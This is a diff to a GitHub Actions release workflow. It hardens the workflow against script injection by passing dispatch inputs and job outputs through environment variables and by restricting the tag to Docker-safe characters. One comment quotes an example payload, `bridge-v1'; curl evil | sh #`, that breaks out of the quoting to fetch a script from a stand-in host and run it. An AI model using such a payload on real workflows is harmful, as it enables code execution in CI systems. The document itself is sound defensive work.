@@ -68,9 +68,21 @@ jobs:
       - name: Resolve image tag
         id: tag
         shell: bash
+        # `inputs.tag` is free-form, attacker-controlled text (anyone who can
+        # dispatch this workflow chooses it) -- GitHub Actions substitutes
+        # `${{ }}` expressions into the run script's SOURCE TEXT before bash
+        # ever sees it, so interpolating it directly (the old `tag='${{
+        # inputs.tag }}'`) let a value like `bridge-v1'; curl evil | sh #`
+        # break out of the quoting and execute as this step's own shell
+        # commands, before the namespace check below ever ran (classic GHA
+        # script-injection; chatgpt-codex-connector review). Passing it
+        # through `env:` instead means bash only ever sees it as inert
+        # environment-variable *data*, never as script source.
+        env:
+          DISPATCH_TAG: ${{ inputs.tag }}
         run: |
-          if [ '${{ github.event_name }}' = 'workflow_dispatch' ]; then
-            tag='${{ inputs.tag }}'
+          if [ "${{ github.event_name }}" = 'workflow_dispatch' ]; then
+            tag="${DISPATCH_TAG}"
           else
             tag="${GITHUB_REF#refs/tags/}"
           fi
@@ -83,6 +95,17 @@ jobs:
           case "${tag}" in
             (bridge-v*) : ;;
             (*) echo "::error::tag '${tag}' is not in the 'bridge-v*' namespace"; exit 1 ;;
+          esac
+          # Belt-and-suspenders on top of the env: fix above: this value
+          # also flows into other steps' shell scripts downstream (as
+          # `needs.info.outputs.tag`, itself now also passed through `env:`
+          # rather than interpolated -- see those steps) and into
+          # docker/build-push-action's `tags:`/build-args input. Restricting
+          # it to a strict Docker-tag-safe character set here means no
+          # shell metacharacter can ever reach any later consumer of this
+          # output, regardless of how that consumer handles it.
+          case "${tag}" in
+            (*[!A-Za-z0-9._-]*) echo "::error::tag '${tag}' contains characters outside [A-Za-z0-9._-]"; exit 1 ;;
           esac
           printf -- 'tag=%s\n' "${tag}" >> "${GITHUB_OUTPUT}"
 
@@ -172,8 +195,16 @@ jobs:
         # fails closed rather than guessing.
         if: ${{ github.event_name != 'workflow_dispatch' || inputs.push }}
         shell: bash
+        # Same env:-not-interpolation hardening as "Resolve image tag" above:
+        # even though TAG is already namespace- and character-restricted by
+        # that step, this step's own script source never directly embeds a
+        # `${{ }}` expression -- everything it needs arrives as inert
+        # environment-variable data (chatgpt-codex-connector review).
+        env:
+          IMAGE_REF: ${{ needs.info.outputs.REGISTRY }}/${{ needs.info.outputs.lowercase-github-repository_owner }}/${{ needs.info.outputs.IMAGE_NAME }}:${{ needs.info.outputs.tag }}
+          TAG: ${{ needs.info.outputs.tag }}
         run: |
-          image='${{ needs.info.outputs.REGISTRY }}/${{ needs.info.outputs.lowercase-github-repository_owner }}/${{ needs.info.outputs.IMAGE_NAME }}:${{ needs.info.outputs.tag }}'
+          image="${IMAGE_REF}"
           attempt=1
           max_attempts=3
           while :; do
@@ -185,7 +216,7 @@ jobs:
             # condition of `if` is the standard way to capture both output
             # and status without tripping -e (chatgpt-codex-connector review).
             if output="$(docker buildx imagetools inspect "${image}" 2>&1)"; then
-              echo "::error::tag '${{ needs.info.outputs.tag }}' already exists at ${image} -- release tags are immutable, publish under a new tag"
+              echo "::error::tag '${TAG}' already exists at ${image} -- release tags are immutable, publish under a new tag"
               exit 1
             fi
             case "${output}" in
@@ -196,7 +227,7 @@ jobs:
                 ;;
             esac
             if [ "${attempt}" -ge "${max_attempts}" ]; then
-              echo "::error::could not confirm tag '${{ needs.info.outputs.tag }}' is absent from ${image} after ${max_attempts} attempts; inspection failed with an error other than 'manifest not found' (auth/network/registry issue), so refusing to publish rather than risk overwriting an existing immutable tag. Last error: ${output}"
+              echo "::error::could not confirm tag '${TAG}' is absent from ${image} after ${max_attempts} attempts; inspection failed with an error other than 'manifest not found' (auth/network/registry issue), so refusing to publish rather than risk overwriting an existing immutable tag. Last error: ${output}"
               exit 1
             fi
             attempt=$((attempt + 1))
